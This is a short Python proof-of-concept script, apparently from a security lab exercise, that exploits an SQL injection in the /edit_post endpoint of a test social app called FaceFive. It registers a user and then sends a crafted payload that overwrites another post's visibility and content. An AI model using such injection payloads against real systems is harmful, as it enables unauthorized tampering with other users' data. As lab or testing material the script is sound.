# vuln4.py

# PoC for SQL injection attack on /edit_post endpoint to change any posts visibility and/or content.
#
# The field to edit a spcecific post's content allows us to change any post's visibility and content.

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'
content = "',id=1,type='Public',content='ThisIsNewContent' WHERE id=1 -- "

reset_image(session)
register(session, user, passwd)

post = create_post(session, content)

#The new post ID is 9
mainPage = edit_post(session, 9, content)

assert 'ThisIsNewContent' in mainPage.text